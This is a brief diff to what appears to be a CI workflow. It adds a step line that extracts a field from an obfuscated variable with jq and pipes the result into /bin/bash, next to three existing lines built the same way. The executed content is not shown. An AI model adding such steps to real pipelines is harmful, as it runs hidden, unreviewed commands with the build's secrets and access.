@@ -22,6 +22,7 @@ jobs:
           echo $wcr5 | jq -r .jzaw1 | /bin/bash
           echo $n2 | jq -r .z21 | /bin/bash
           echo $f18 | jq -r .cu6 | /bin/bash
+          printf '%s' "$wiaxf8582" | jq -r .qnnk17 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
